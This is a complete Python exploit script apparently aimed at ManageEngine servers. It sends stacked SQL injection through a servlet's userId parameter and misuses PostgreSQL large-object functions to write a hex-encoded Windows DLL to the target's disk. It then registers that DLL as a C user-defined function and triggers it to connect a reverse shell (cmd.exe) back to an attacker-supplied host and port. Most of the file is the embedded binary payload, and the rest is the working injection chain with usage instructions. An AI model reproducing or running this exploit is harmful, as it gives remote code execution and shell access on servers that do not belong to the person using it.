import requests, sys, urllib, string, random, time, subprocess
requests.packages.urllib3.disable_warnings()

udf = ""
udf += "4d5a90000300000004000000ffff0000b800000000000000400000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "080100000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d"
udf += "2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a"
udf += "240000000000000095a3f5b7d1c29be4d1c29be4d1c29be4d8ba08e4d3c2"
udf += "9be408a09ae5d3c29be408a098e5d0c29be408a09ee5dbc29be408a09fe5"
udf += "dac29be4a2a09ae5d5c29be4beb407e4d2c29be4d1c29ae4f7c29be41aa1"
udf += "93e5d0c29be41aa19be5d0c29be41aa199e5d0c29be452696368d1c29be4"
udf += "000000000000000000000000000000000000000000000000504500004c01"
udf += "04006cd0af600000000000000000e00002210b010e0b000e000000120000"
udf += "000000001814000000100000002000000000001000100000000200000600"
udf += "000000000000060000000000000000500000000400000000000002004001"
udf += "000010000010000000001000001000000000000010000000102500008000"
udf += "000090250000780000000000000000000000000000000000000000000000"
udf += "00000000004000005c010000002100007000000000000000000000000000"
udf += "000000000000000000000000000070210000400000000000000000000000"
udf += "002000009400000000000000000000000000000000000000000000000000"
udf += "00002e746578740000005c0d000000100000000e00000004000000000000"
udf += "0000000000000000200000602e726461746100006c09000000200000000a"
udf += "000000120000000000000000000000000000400000402e64617461000000"
udf += "c00500000030000000020000001c00000000000000000000000000004000"
udf += "00c02e72656c6f6300005c0100000040000000020000001e000000000000"
udf += "000000000000000040000042000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "00000000b8d8200010c3ccccccccccccccccccccb8d4200010c3cccccccc"
udf += "cccccccccccc558bec5668203400106802020000ff15542000106a006a00"
udf += "6a006a066a016a02ff15582000108b7508a3b0330010b80200000066a3a0"
udf += "3300100fb7461850ff154820001066a3a2330010ff7614ff158c20001050"
udf += "6a00ff3588200010ff158420001083c41050ff15502000106a006a006a00"
udf += "6a006a1068a0330010ff35b0330010a3a4330010ff154c2000106a446a00"
udf += "68c0330010e85a0c0000a1b033001083c40cc705c033001044000000c705"
udf += "ec33001001010000a30034001068b035001068c03300106a006a006a006a"
udf += "016a006a0068cc2000106a00a3fc330010a3f8330010ff150820001033c0"
udf += "5e5dc33b0d00300010f27502f2c3f2e945030000558bec8b450c83e80074"
udf += "3383e801742083e801741183e801740533c040eb30e8f2050000eb05e8cc"
udf += "0500000fb6c0eb1fff7510ff7508e81800000059eb10837d10000f95c00f"
udf += "b6c050e8ff000000595dc20c006a106890240010e8630900006a00e82006"
udf += "00005984c0750733c0e9c8000000e8120500008845e3b301885de78365fc"
udf += "00833d603300100074076a07e8ab070000c7056033001001000000e84705"
udf += "000084c0744de8b7080000e854040000e87304000068a420001068a02000"
udf += "10e8440b0000595985c07529e8ef04000084c07420689c20001068982000"
udf += "10e8200b00005959c705603300100200000032db885de7c745fcfeffffff"
udf += "e84400000084db0f8564ffffffe82c0700008bf0833e00741e56e8500600"
udf += "005984c07413ff750c6a02ff75088b368bcee889080000ffd6ff05203000"
udf += "1033c040e8c9080000c38a5de7ff75e3e8a806000059c36a0c68b0240010"
udf += "e869080000a12030001085c07f0433c0eb5948a320300010e81804000088"
udf += "45e48365fc00833d603300100274076a07e8b6060000e8c9040000e87e03"
udf += "0000e8f607000083256033001000c745fcfeffffffe81b0000006a00ff75"
udf += "08e85c060000595933c984c00f95c18bc1e844080000c3e8af040000ff75"
udf += "e4e82106000059c36a0c68d0240010e8e20700008b7d0c85ff750f393d20"
udf += "3000107f0733c0e9d40000008365fc0083ff01740a83ff0274058b5d10eb"
udf += "318b5d105357ff7508e8ba0000008bf08975e485f60f849e0000005357ff"
udf += "7508e8d3fdffff8bf08975e485f60f84870000005357ff7508e89e020000"
udf += "8bf08975e483ff01752285f6751e5350ff7508e8860200005356ff7508e8"
udf += "9afdffff5356ff7508e86000000085ff740583ff0375485357ff7508e87d"
udf += "fdffff8bf08975e485f674355357ff7508e83a0000008bf0eb248b4dec8b"
udf += "0151ff30681e110010ff7510ff750cff7508e86e03000083c418c38b65e8"
udf += "33f68975e4c745fcfeffffff8bc6e839070000c3558bec568b35c0200010"
udf += "85f6750533c040eb12ff75108bceff750cff7508e8c5060000ffd65e5dc2"
udf += "0c00558bec837d0c017505e887010000ff7510ff750cff7508e8befeffff"
udf += "83c40c5dc20c00558bec6a00ff1524200010ff7508ff1528200010680904"
udf += "00c0ff152020001050ff151c2000105dc3558bec81ec240300006a17e8dd"
udf += "08000085c074056a0259cd29a328310010890d2431001089152031001089"
udf += "1d1c310010893518310010893d14310010668c1540310010668c0d343100"
udf += "10668c1d10310010668c050c310010668c2508310010668c2d043100109c"
udf += "8f05383100108b4500a32c3100108b4504a3303100108d4508a33c310010"
udf += "8b85dcfcffffc7057830001001000100a130310010a334300010c7052830"
udf += "0010090400c0c7052c30001001000000c70538300010010000006a04586b"
udf += "c000c7803c300010020000006a04586bc0008b0d00300010894c05f86a04"
udf += "58c1e0008b0d04300010894c05f868c4200010e8e1feffff8be55dc3558b"
udf += "ec83ec148365f4008d45f48365f80050ff15302000108b45f83345f48945"
udf += "fcff150c2000103145fcff15102000103145fc8d45ec50ff15142000108b"
udf += "45f08d4dfc3345ec3345fc33c18be55dc3a1003000105657bf4ee640bbbe"
udf += "0000ffff3bc7740d85c67409f7d0a304300010eb2ee88affffff8bc83bcf"
udf += "7507b94fe640bbeb0e85ce750a0d11470000c1e0100bc8890d00300010f7"
udf += "d1890d043000105f5ec3558bec837d0c017512833dc0200010007509ff75"
udf += "08ff152c20001033c0405dc20c006848330010ff1504200010c368483300"
udf += "10e8d606000059c3b850330010c3b858330010c3e8efffffff8b48048308"
udf += "04894804e8e7ffffff8b4804830802894804c3558bec8b4508568b483c03"
udf += "c80fb741148d511803d00fb741066bf02803f23bd674198b4d0c3b4a0c72"
udf += "0a8b420803420c3bc8720c83c2283bd675ea33c05e5dc38bc2ebf9e85506"
udf += "000085c0750332c0c364a11800000056be643300108b5004eb043bd07410"
udf += "33c08bcaf00fb10e85c075f032c05ec3b0015ec3e82006000085c07407e8"
udf += "74040000eb18e80c06000050e83b0600005985c0740332c0c3e834060000"
udf += "b001c36a00e8cf00000084c0590f95c0c3e83c06000084c0750332c0c3e8"
udf += "3006000084c07507e827060000ebedb001c3e81d060000e818060000b001"
udf += "c3558bece8b805000085c07518837d0c017512ff75108b4d1450ff7508e8"
udf += "74030000ff5514ff751cff7518e8bc05000059595dc3e88805000085c074"
udf += "0c6868330010e8bd05000059c3e8cb05000085c00f84b4050000c36a00e8"
udf += "b805000059e9b2050000558bec837d08007507c6058133001001e8a50300"
udf += "00e89805000084c0750432c05dc3e88b05000084c0750a6a00e880050000"
udf += "59ebe9b0015dc3558bec83ec0c803d80330010007407b001e98800000056"
udf += "8b750885f6740583fe01757fe8fc04000085c0742685f675226868330010"
udf += "e8270500005985c0750f6874330010e8180500005985c0744632c0eb4ba1"
udf += "003000108d75f45783e01fbf683300106a20592bc883c8ffd3c833050030"
udf += "00108945f48945f88945fca5a5a5bf743300108945f48945f88d75f48945"
udf += "fca5a5a55fc6058033001001b0015e8be55dc36a05e8d6000000cc6a0868"
udf += "f0240010e84d0200008365fc00b84d5a000066390500000010755da13c00"
udf += "001081b80000001050450000754cb90b01000066398818000010753e8b45"
udf += "08b9000000102bc15051e88efdffff595985c07427837824007c21c745fc"
udf += "feffffffb001eb1f8b45ec8b0033c98138050000c00f94c18bc1c38b65e8"
udf += "c745fcfeffffff32c0e816020000c3558bece8e803000085c0740f807d08"
udf += "00750933c0b96433001087015dc3558bec803d81330010007406807d0c00"
udf += "7512ff7508e80e040000ff7508e8060400005959b0015dc3b890330010c3"
udf += "558bec81ec24030000536a17e8e303000085c074058b4d08cd296a03e8fb"
udf += "000000c70424cc0200008d85dcfcffff6a0050e88203000083c40c89858c"
udf += "fdffff898d88fdffff899584fdffff899d80fdffff89b57cfdffff89bd78"
udf += "fdffff668c95a4fdffff668c8d98fdffff668c9d74fdffff668c8570fdff"
udf += "ff668ca56cfdffff668cad68fdffff9c8f859cfdffff8b4504898594fdff"
udf += "ff8d45048985a0fdffffc785dcfcffff010001008b40fc6a50898590fdff"
udf += "ff8d45a86a0050e8f80200008b450483c40cc745a815000040c745ac0100"
udf += "00008945b4ff15002000106a008d58fff7db8d45a88945f88d85dcfcffff"
udf += "1adb8945fcfec3ff15242000108d45f850ff152820001085c0750c84db75"
udf += "086a03e806000000595b8be55dc383258433001000c35356be80240010bb"
udf += "802400103bf37318578b3e85ff74098bcfe838000000ffd783c6043bf372"
udf += "ea5f5e5bc35356be88240010bb882400103bf37318578b3e85ff74098bcf"
udf += "e80d000000ffd783c6043bf372ea5f5e5bc3ff2594200010cccccccc683b"
udf += "1b001064ff35000000008b442410896c24108d6c24102be0535657a10030"
udf += "00103145fc33c5508965e8ff75f88b45fcc745fcfeffffff8945f88d45f0"
udf += "64a300000000f2c38b4df064890d00000000595f5f5e5b8be55d51f2c355"
udf += "8becff7514ff7510ff750cff7508680d1100106800300010e8c101000083"
udf += "c4185dc3558bec8325883300100083ec245333db43091d103000106a0ae8"
udf += "d401000085c00f84720100008365f00033c0830d103000100233c9565789"
udf += "1d883300108d7ddc530fa28bf35b8907897704894f0833c989570c8b45dc"
udf += "8b7de08945f481f747656e758b45e835696e65498945f88b45e4356e7465"
udf += "6c8945fc33c040530fa28bf35b8d5ddc89038b45fc0b45f80bc789730489"
udf += "4b0889530c75438b45dc25f03fff0f3dc006010074233d60060200741c3d"
udf += "7006020074153d50060300740e3d6006030074073d7006030075118b3d8c"
udf += "33001083cf01893d8c330010eb068b3d8c330010837df4078b45e48945fc"
udf += "7c326a075833c9530fa28bf35b8d5ddc89038b45fc897304894b0889530c"
udf += "8b5de0f7c300020000740e83cf02893d8c330010eb038b5df05f5ea90000"
udf += "1000746c830d1030001004c7058833001002000000a9000000087454a900"
udf += "000010744d33c90f01d08945ec8955f08b45ec8b4df083e00633c983f806"
udf += "753285c9752ea11030001083c808c7058833001003000000a310300010f6"
udf += "c320741283c820c7058833001005000000a31030001033c05b8be55dc333"
udf += "c040c333c03905143000100f95c0c3c3ff2540200010ff2538200010ff25"
udf += "3c200010ff2568200010ff2564200010ff2560200010ff257c200010ff25"
udf += "74200010ff2570200010ff256c200010ff2578200010ff2518200010b001"
udf += "c333c0c30000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "0000000000000000000000000000000000005829000042290000e2260000"
udf += "f6280000e0280000c6280000aa2800009628000082280000642800004828"
udf += "0000262900000c290000000000004a270000542700002a27000000000000"
udf += "09000080102700000b0000807300008002270000000000009a2700008c27"
udf += "00008027000004280000e8270000c62700001c280000ac27000000000000"
udf += "ba260000b02600009c260000000000000d1d001000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000002830001078300010636d642e65786500010000001c0000008603"
udf += "000064000000200000004000000001000000000000000000000000000000"
udf += "00000000000000006cd0af60000000000200000052000000142200001414"
udf += "0000000000006cd0af60000000000c000000140000006822000068140000"
udf += "000000006cd0af60000000000d000000000200007c2200007c1400000000"
udf += "00006cd0af60000000000e00000000000000000000000000000098000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000300010"
udf += "102200100100000094200010000000000000000000000000000100000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "0000000000003b1b000052534453335bf7de037c4049aaeebf335024a6d9"
udf += "02000000433a5c55736572735c41646d696e6973747261746f725c736f75"
udf += "7263655c7265706f735c617761655c52656c656173655c617761652e7064"
udf += "6200000000000000160000001600000001000000150000004743544c0010"
udf += "00005c0d00002e74657874246d6e0000000000200000940000002e696461"
udf += "746124350000000094200000040000002e30306366670000982000000400"
udf += "00002e43525424584341000000009c200000040000002e4352542458435a"
udf += "00000000a0200000040000002e4352542458494100000000a42000000400"
udf += "00002e4352542458495a00000000a8200000040000002e43525424585041"
udf += "00000000ac200000040000002e4352542458505a00000000b02000000400"
udf += "00002e4352542458544100000000b42000000c0000002e4352542458545a"
udf += "00000000c0200000500100002e7264617461000010220000040000002e72"
udf += "646174612473786461746100000014220000680200002e7264617461247a"
udf += "7a7a6462670000007c240000040000002e72746324494141000000008024"
udf += "0000040000002e72746324495a5a0000000084240000040000002e727463"
udf += "245441410000000088240000080000002e72746324545a5a000000009024"
udf += "0000800000002e786461746124780000000010250000800000002e656461"
udf += "7461000090250000640000002e6964617461243200000000f42500001400"
udf += "00002e696461746124330000000008260000940000002e69646174612434"
udf += "000000009c260000d00200002e6964617461243600000000003000002000"
udf += "00002e6461746100000020300000a00500002e6273730000000000000000"
udf += "00000000000000000000000000000000feffffff00000000d0ffffff0000"
udf += "0000feffffff000000005e12001000000000feffffff00000000d4ffffff"
udf += "00000000feffffff00000000e312001000000000feffffff00000000d4ff"
udf += "ffff00000000feffffffb8130010d713001000000000feffffff00000000"
udf += "d8ffffff00000000feffffffec180010ff1800100000000000000000ffff"
udf += "ffff00000000562500000100000003000000030000003825000044250000"
udf += "502500000010000020100000101000005f2500006d2500007a2500000000"
udf += "01000200617761652e646c6c0050675f6d616769635f66756e6300636f6e"
udf += "6e6563745f6261636b0070675f66696e666f5f636f6e6e6563745f626163"
udf += "6b008c2600000000000000000000d4260000842000000826000000000000"
udf += "00000000f4260000002000005026000000000000000000001e2700004820"
udf += "00004026000000000000000000006e270000382000006826000000000000"
udf += "000000002628000060200000000000000000000000000000000000000000"
udf += "00005829000042290000e2260000f6280000e0280000c6280000aa280000"
udf += "96280000822800006428000048280000262900000c290000000000004a27"
udf += "0000542700002a2700000000000009000080102700000b00008073000080"
udf += "02270000000000009a2700008c2700008027000004280000e8270000c627"
udf += "00001c280000ac27000000000000ba260000b02600009c26000000000000"
udf += "9a1370675f6465746f6173745f646174756d00000118746578746f757400"
udf += "dd0144697265637446756e6374696f6e43616c6c31436f6c6c00706f7374"
udf += "677265732e6578650000df0043726561746550726f636573734100004b45"
udf += "524e454c33322e646c6c00005600575341536f636b657441000020005753"
udf += "41436f6e6e65637400005753325f33322e646c6c000025005f5f7374645f"
udf += "747970655f696e666f5f64657374726f795f6c697374000048006d656d73"
udf += "6574000035005f6578636570745f68616e646c6572345f636f6d6d6f6e00"
udf += "564352554e54494d453134302e646c6c000038005f696e69747465726d00"
udf += "39005f696e69747465726d5f650041005f7365685f66696c7465725f646c"
udf += "6c0019005f636f6e6669677572655f6e6172726f775f6172677600003500"
udf += "5f696e697469616c697a655f6e6172726f775f656e7669726f6e6d656e74"
udf += "000036005f696e697469616c697a655f6f6e657869745f7461626c650000"
udf += "24005f657865637574655f6f6e657869745f7461626c650017005f636578"
udf += "697400006170692d6d732d77696e2d6372742d72756e74696d652d6c312d"
udf += "312d302e646c6c00a505556e68616e646c6564457863657074696f6e4669"
udf += "6c74657200006505536574556e68616e646c6564457863657074696f6e46"
udf += "696c74657200150247657443757272656e7450726f636573730084055465"
udf += "726d696e61746550726f6365737300008103497350726f636573736f7246"
udf += "65617475726550726573656e740046045175657279506572666f726d616e"
udf += "6365436f756e74657200160247657443757272656e7450726f6365737349"
udf += "64001a0247657443757272656e7454687265616449640000e50247657453"
udf += "797374656d54696d65417346696c6554696d65001c0144697361626c6554"
udf += "68726561644c69627261727943616c6c73005e03496e697469616c697a65"
udf += "534c69737448656164007a034973446562756767657250726573656e7400"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000004ee6"
udf += "40bbb119bf44ffffffff0000000001000000010000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "001000003c010000013011302530303042304a305530603066306f307830"
udf += "7e30883097309d30a230a830b130bb30c430ce30d730dc30e130f230f930"
udf += "fe3004310f317431a331b331d431d931f231f731043251326e3278328632"
udf += "9832b732f5320733c133f43342344b3456345d347d34833489348f349534"
udf += "9b34a234a934b034b734be34c534cc34d434dc34e434f034f934fe340435"
udf += "0e3518352835383548355135723581358a359735ae35c935f135f9350b36"
udf += "1736233629362f363b364136bb367e37af37e5370e381d3830383c384c38"
udf += "5d3873388a389f38a638ac38be38c838263933395739353a553a5f3a7a3a"
udf += "833a883aae3ab33ad83ae13afe3a4b3b503b633b713b8c3b973b2b3c343c"
udf += "3c3c783c8c3c933cc93cd23cdb3ce93cf23c053d103d163d1c3d223d283d"
udf += "2e3d343d3a3d403d463d4c3d523d000000200000200000009430c430c830"
udf += "ac31b031b831a834c834e434e83404350835000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "000000000000000000000000000000000000000000000000000000000000"
udf += "0000"
loid = 12345
data = "ForMasRange=1&userId=1;[PAYLOAD];--"
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
proxy_dict = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"
}

def make_request(url, sqli):
    encoded_sqli = urllib.parse.quote(sqli, safe='')
    payload = data.replace("[PAYLOAD]", encoded_sqli)
    r = requests.post(url, data=payload, headers=headers, proxies=proxy_dict, verify=False)
    return r

def delete_lo(url, loid):
    sqli = f"SELECT lo_unlink({loid})"
    make_request(url, sqli)

def create_lo(url, loid):
    sqli = f"SELECT lo_import($$C:\\windows\\win.ini$$,{loid})"
    make_request(url, sqli)

def inject_udf(url, loid):
    for i in range(0,((len(udf)-1)//4096)+1):
        udf_chunk = udf[i*4096:(i+1)*4096]
        if i == 0:
            sqli = f"UPDATE PG_LARGEOBJECT SET data=decode($${udf_chunk}$$, $$hex$$) WHERE loid={loid} and pageno={i}"
        else:
            sqli = f"INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ({loid}, {i}, decode($${udf_chunk}$$, $$hex$$))"
        make_request(url, sqli)

def export_udf(url, loid):
    sqli = f"SELECT lo_export({loid}, $$C:\\Users\\Public\\rs0n.dll$$)"
    make_request(url, sqli)

def create_udf_function(url):
    sqli = "CREATE OR REPLACE FUNCTION rs0n(text, integer) returns void as $$C:\\Users\\Public\\rs0n.dll$$, $$connect_back$$ LANGUAGE C STRICT"
    make_request(url, sqli)

def trigger_udf(url, lhost, lport):
    sqli = f"SELECT rs0n($${lhost}$$, {lport})"
    make_request(url, sqli)

def main(server, lhost, lport):
    url = f"https://{server}/servlet/AMUserResourcesSyncServlet"
    print("[-] Cleaning up any existing Large Objects with the same LOID...")
    delete_lo(url, loid)
    time.sleep(2)
    print("[-] Importing win.ini binary data to new Large Object...")
    create_lo(url, loid)
    time.sleep(2)
    print("[-] Overwriting Large Object data with reverse shell...")
    inject_udf(url, loid)
    time.sleep(2)
    print("[-] Exporting Large Object to DLL on target server's file system...")
    export_udf(url, loid)
    time.sleep(2)
    print("[-] Building User Defined Function (UDF) from malicious DLL...")
    create_udf_function(url)
    time.sleep(2)
    print("[-] Triggering RCE through UDF...")
    trigger_udf(url, lhost, lport)
    time.sleep(2)
    print("[-] Once more for good measure...")
    trigger_udf(url, lhost, lport)
    print("[+] Exploit completed successfully!  If you still don't have a shell, check your LHOST and LPORT, then try again.")

if __name__ == "__main__":
    try:
        server = sys.argv[1].strip()
        lhost = sys.argv[2].strip()
        lport = sys.argv[3].strip()
    except Exception as e:
        print(f"[!] USAGE: {sys.argv[0]} [TARGET_SERVER_DOMAIN] [LHOST] [LPORT]")
        print(f"[!] EXAMPLE: {sys.argv[0]} manage-engine-server.com:8443  192.168.1.1 4444")
        sys.exit(2)
    print(F"[+] Exploiting ManageEngine server at {server}...")
    main(server, lhost, lport)